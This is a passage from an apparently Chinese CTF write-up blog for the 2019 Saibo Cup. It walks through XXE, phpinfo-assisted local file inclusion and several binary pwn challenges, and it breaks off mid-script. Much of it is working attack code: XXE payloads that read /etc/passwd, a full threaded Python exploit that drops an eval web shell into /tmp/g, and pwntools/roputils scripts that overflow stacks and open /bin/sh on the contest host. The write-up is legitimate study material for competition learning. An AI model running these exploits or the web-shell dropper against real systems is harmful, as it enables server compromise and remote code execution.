class="comment">#post过去</span></span><br><span class="line"></span><br><span class="line">if(<span class="string">"猜测错误"</span> not  in re2.text):</span><br><span class="line">	print(re2.text)</span><br></pre></td></tr></table></figure>

<p>发现无法获得flag，后来发现pwd赋值为空可以获得flag，可能是<strong>$_SESSION[‘pwd’]=time();</strong>没有执行成功。</p>
<h3 id="Simple-XXE"><a href="#Simple-XXE" class="headerlink" title="Simple XXE"></a>Simple XXE</h3><p>首先，了解一下XXE，（xml外部实体注入漏洞）</p>
<p>参考文章：<a href="https://www.cnblogs.com/cui0x01/p/8823690.html" target="_blank" rel="noopener">https://www.cnblogs.com/cui0x01/p/8823690.html</a></p>
<p>（然后跟这个文章走2333）</p>
<p>首先f12看到dom.php存在XXE，于是构造XML文本先验证漏洞，</p>
<p>这一步骤将XML内容发送给服务器，当服务器将XML解析完成后，就会依照解析的内容工作，这段XML中<code>SYSTEM &quot;file:///etc/passwd&quot;</code>部分引用了目标服务器(即<code>172.16.12.2</code>)下的<code>/etc/passwd</code>文件，服务器解析XML内容后，会将这一文件内容存入<code>&amp;xxe</code>中，然后将数据返回给恶意访问者。</p>
<p>执行完成上面的操作后，点击GO，右侧将出现此数据包的返回结果，内容如下，返回的数据为服务器上<code>/etc/passwd</code>文件的内容</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/9.png" alt="9"></p>
<p>漏洞验证成功，</p>
<p>于是修改XML中的外部实体为其他协议，根据提示看hint，<code>php://filter/read=convert.base64-encode/resource=hint.php</code>，在Proxy选项卡的原数据包中粘贴XML内容，点击FORWARD放行请求，返回的结果</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/10.png" alt="10"></p>
<p>解码后得到目录，<img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/11.png" alt="11"></p>
<p>于是</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/12.png" alt="12"></p>
<p>解码得到flag</p>
<h3 id="inclusion"><a href="#inclusion" class="headerlink" title="inclusion"></a>inclusion</h3><p>进入页面，f12，发现注释 phpinfo.php</p>
<p>然后根据名字，猜测是php文件包含漏洞（利用phpinfo）</p>
<p>参考这篇文章（又是跟着文章走）<a href="https://www.cnblogs.com/xiaoqiyue/p/10158702.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoqiyue/p/10158702.html</a></p>
<p>访问<a href="http://47.110.227.208:8001/lfi.php?file=/etc/passwd" target="_blank" rel="noopener">http://47.110.227.208:8001/lfi.php?file=/etc/passwd</a>验证漏洞，<img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/13.png" alt="13"></p>
<p>成功。</p>
<p>文章如是说：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">先讲一下利用phpinfo上传文件，然后在文件包含的原理：</span><br><span class="line"></span><br><span class="line">参考链接：https:<span class="regexp">//gi</span>thub.com<span class="regexp">/vulhub/</span>vulhub<span class="regexp">/tree/m</span>aster<span class="regexp">/php/i</span>nclusion</span><br><span class="line"></span><br><span class="line">在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是<span class="regexp">/tmp/</span>php[<span class="number">6</span>个随机字符]），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。</span><br><span class="line"></span><br><span class="line">因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。</span><br><span class="line"></span><br><span class="line">但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>）PHP默认缓冲区大小是<span class="number">4096</span>，即PHP每次返回<span class="number">4096</span>个字节给socket连接</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>）所以，我们直接操作原生socket，每次读取<span class="number">4096</span>个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出<span class="number">4096</span>个字节，所以临时文件还未被删除</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>）我们可以利用这个时间差，成功包含临时文件，最后getshell</span><br></pre></td></tr></table></figure>

<p>利用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    self.event.set()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/15.png" alt="15"></p>
<p>运行脚本</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/16.png" alt="16"></p>
<p>（表示后来没有上传成功，但似乎有大佬先上传成功了，所以后面的步骤我也能继续做）</p>
<p>先验证是否上传成功</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/70.png" alt="70"></p>
<p>嗯，的确有大佬上传成功了，连文件名也一样，好的，谢谢了。getsheell</p>
<p>于是<img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/36.png" alt="36"></p>
<p>flag应该在那个奇怪名字的文件里吧</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/28.png" alt="28"></p>
<p>果然，</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/89.png" alt="89"></p>
<p>拿到flag</p>
<p>这题的关键还是上传有大量垃圾数据的恶意文件吧。（所以哪位大佬上传成功了）</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="hardpwn"><a href="#hardpwn" class="headerlink" title="hardpwn"></a>hardpwn</h3><p>导入IDA后，发现需要覆盖运行参数（即argv），因为栈溢出很长且可以覆盖到该参数，所以可以考虑直接覆盖</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="built_in">import</span> *</span><br><span class="line">context.<span class="attr">log_level</span> = <span class="string">"debug"</span></span><br><span class="line">context.<span class="attr">arch</span> = <span class="string">"amd64"</span></span><br><span class="line"><span class="attr">elf</span> = ELF(<span class="string">"pwn1"</span>)</span><br><span class="line"><span class="attr">sh</span> = <span class="number">0</span></span><br><span class="line"><span class="attr">lib</span> = <span class="number">0</span></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	<span class="keyword">if</span>(<span class="attr">debug</span> == <span class="number">1</span>):</span><br><span class="line">		<span class="attr">sh</span> = process(<span class="string">"./pwn1"</span>)</span><br><span class="line">	<span class="keyword">else</span>:	</span><br><span class="line">		<span class="attr">sh</span> = remote(ip,port)</span><br><span class="line">	<span class="attr">payload</span> = '\x00' * <span class="number">120</span> +<span class="string">"aaaa"</span> + <span class="string">"\x00"</span></span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line"><span class="keyword">if</span> <span class="attr">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">	pwn(<span class="string">"47.110.227.208"</span>,<span class="number">10001</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/59.png" alt="59"></p>
<h3 id="stackpwn"><a href="#stackpwn" class="headerlink" title="stackpwn"></a>stackpwn</h3><p>导入IDA后，发现没有puts、write等，只有read且有溢出，那么这道题就是典型的考察ret2_dl_resolve，用ctf-wiki的脚本改一下就可以拿到shell了</p>
<p>利用roputils简化攻击</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">from pwn import remote</span><br><span class="line"><span class="comment">#r = process('./pwn3')</span></span><br><span class="line">r = remote(<span class="string">"47.110.227.208"</span>,10003)</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">rop = ROP('./pwn3')</span><br><span class="line">offset = 60</span><br><span class="line">bss_base = 0x804a000 + 0x800</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line">buf += rop.call('read', 0, bss_base, 100)</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line">buf = rop.string('/bin/sh')</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, 'system')</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/35.png" alt="35"></p>
<h3 id="floatpwn"><a href="#floatpwn" class="headerlink" title="floatpwn"></a>floatpwn</h3><p>这题考察了确定浮点寄存器通过movss写入内存时的数值</p>
<p>方法：只能人工二分法一次一次去尝试，然后发现小数点后45位之前可以忽略不计，真正开始有意义的数值在小数点后45位开始。然后求出对应的n使得写回内存时是我想要的数值，从而构造ROP链。但是想构造ROP链之前需要实现无限写，所以输入size时，可以考虑输入负数，实现无符号整数溢出，从而无限写。因为控制写入数据位置的i变量位于栈空间底部，所以要使得写到i里的数据为10到12即可，因为可以考虑直接略过ebp，直接修改rip。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">elf = ELF(<span class="string">"pwn2"</span>)</span><br><span class="line">sh = <span 